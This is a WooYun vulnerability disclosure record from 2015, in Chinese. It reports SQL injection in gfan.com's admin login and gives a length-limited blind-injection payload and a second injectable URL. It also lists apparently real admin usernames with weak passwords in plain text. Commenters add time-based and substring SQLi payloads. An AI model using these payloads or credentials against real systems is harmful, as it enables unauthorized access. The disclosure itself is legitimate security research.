{"id": 45444, "wybug_id": "wooyun-2015-0101960", "wybug_title": "机锋网后台存在SQL注入漏洞（注射技巧bypass字符长度限制）", "wybug_corp": "机锋网", "wybug_author": "子非海绵宝宝", "wybug_date": "2015-03-17 22:34", "wybug_open_date": "2015-03-22 22:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT感谢@Noxxx 大神的指点 报错注入变成32位字符限制注入 详细说明：  \nhttp://admin.tsz.gfan.com/login.php?act=logging\n\nusername=wangxi&password=123&auth=6268\n这里的注入比较有意思\n\n报错注入但是....\n\n他检查了长度  也就是说注入的完整语句不能超过32个字符报错是肯定不够的  只能盲注\nselect * from `condorgame_managers` where `username`='123'' LIMIT 1 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''123'' LIMIT 1' at line 1 1064\n看下的语句那么可以这么写\nduyun'&&SUBSTR(passwd,1,1)='a\n使得语句变成select * from `condorgame_managers` where `username`='duyun'&&SUBSTR(passwd,1,1)='a'这样语句是29个字符 可以注入了并且可以猜出密码的MD5值用户名直接使用常用用户名进行爆破duyun 123456wangyu 123!@#wangxi 321321还都是弱密码其中wangyu 123!@# 权限较大  可以操作的东西比较多\n\n在其中找到新的注入点 且没有限制  盲注\nhttp://admin.tsz.gfan.com/index.php?offset=15&mod=product&act=edit&time=&serverid=1023\n\n\n   漏洞证明：  如上   修复方案：  过滤   版权声明：转载请注明来源 子非海绵宝宝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-03-22 22:36 厂商回复：  漏洞Rank：10  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-17 22:36 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  加乌云了~打雷了 快回家收衣服啦！mark一下，当做教程。@水晶  好东西，妹纸快来看    \n     2015-03-17 22:38 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  强到不行！！    \n     2015-03-17 22:43 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  。。。。。 不玩众测来主站啊    \n     2015-03-17 22:44 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @zeracker 无意发现的....就交主站了     \n     2015-03-17 22:53 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @子非海绵宝宝 ||这种字符？    \n     2015-03-17 23:04 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-03-17 23:48 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  果断关注！    \n     2015-03-18 09:05 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  雷劈了一下。太乌云了。    \n     2015-03-18 09:14 |    \t\tlight \t\t\t( 普通白帽子  |\t\t\t        Rank:261 漏洞数:48        | 精华漏洞数:36 | WooYun认证√ 艺术系教授 ...)\t\t \n  mark 坐等神技    \n     2015-03-18 09:26 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  围观大神    \n     2015-03-18 09:33 |    \t\t我哪知道啊 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        )\t\t \n  mark    \n     2015-03-18 10:37 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  mark学习    \n     2015-03-18 11:45 |    \t\t3King \t\t\t( 普通白帽子  |\t\t\t        Rank:1129 漏洞数:92        | 【study at HNUST】非常感谢大家的关注~ 大...)\t\t \n  6666666    \n     2015-03-18 11:45 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  mark    \n     2015-03-18 11:47 |    \t\twinalva \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | rank是什么？)\t\t \n  mark学习    \n     2015-03-18 12:13 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  学习    \n     2015-03-18 14:42 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @子非海绵宝宝 good!    \n     2015-03-18 15:35 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  666666666    \n     2015-03-18 15:47 |    \t\tgone \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 来学习的)\t\t \n  学习    \n     2015-03-19 11:06 |    \t\t水晶 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:15        | 热爱生活，喜欢互联网)\t\t \n  @Ton7BrEak OK    \n     2015-03-19 15:58 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @机锋网 后交的都确认了  这个怎么没确认?    \n     2015-03-22 20:17 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @xsser 求补RANK    \n     2015-03-22 22:40 |    \t\t机锋网(乌云厂商)\t\t \n  确认，正在解决，谢谢了    \n     2015-03-22 22:54 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @机锋网 超时后4分钟就回复了....还我RANK....双倍!    \n     2015-03-22 23:08 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  @子非海绵宝宝 深藏功与名    \n     2015-03-22 23:08 |    \t\t鸟云厂商  \t\t\t( 核心白帽子 |\t\t\t        Rank:1313 漏洞数:146        | 中国菜鸟)\t\t \n  这个确实改补    \n     2015-03-22 23:10 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  有点意思啊.    \n     2015-03-23 00:16 |    \t\tKnight \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:10        | 刚刚上洗手间，看到一个玉树临风的少年，气...)\t\t \n  目测穿山甲。    \n     2015-03-23 08:19 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @子非海绵宝宝 看来我说对了，|| &&    \n     2015-03-23 09:19 |    \t\t水晶 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:15        | 热爱生活，喜欢互联网)\t\t \n  @Ton7BrEak OK    \n     2015-03-23 09:27 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  故意的╭(╯^╰)╮    \n     2015-03-23 09:30 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  厂商忽略的好啊~提前学到了~ （洞主很无奈啊！）    \n     2015-03-23 16:28 |    \t\txtnnd \t\t\t( 普通白帽子  |\t\t\t        Rank:180 漏洞数:43        )\t\t \n  @疯狗 求审核  http://www.wooyun.org/bugs/wooyun-2015-0100938/trace/ab0e5e5792df40ff91c799a791437d73http://www.wooyun.org/bugs/wooyun-2015-0103231/trace/81e4491c6f9b67c90badb817042f0a01    \n     2015-03-23 19:07 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  学习了！    \n     2015-03-26 13:03 |    \t\tme1ody \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:15        | 乌云临时工)\t\t \n  学习了 玩游戏    \n     2015-03-28 09:46 |    \t\t炮灰乙 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 我叫路人甲，我住在中国)\t\t \n  这没有bypass啊 只能爆密码 我还以为从其它参数配合带进sql语句或者把一条sql拆成N条    \n     2015-04-03 00:51 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  mid(data,1,1) = 'a'#substring(data,1,1) = 'a'#AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(2000000,md5(now())))' or 1 rlike '1\t\tSome functions allow to search substrings:\t\t'-if(locate('f',data),1,0)#\t\t'-if(locate('fo',data),1,0)#\t\t'-if(locate('foo',data),1,0)#\t\t\t\t● Some functions allow to cut substrings:\t\tlength(trim(leading 'a' FROM data)) # length will be shorter\t\tlength(replace(data, 'a', '')) # length will be shorter    \n     2015-08-20 19:52 |    \t\tBurn Egg \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:8        | 经验，范围，字典，思维)\t\t \n  @子非海绵宝宝 长度限制应该也可以用passwd like 'a%'，，    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}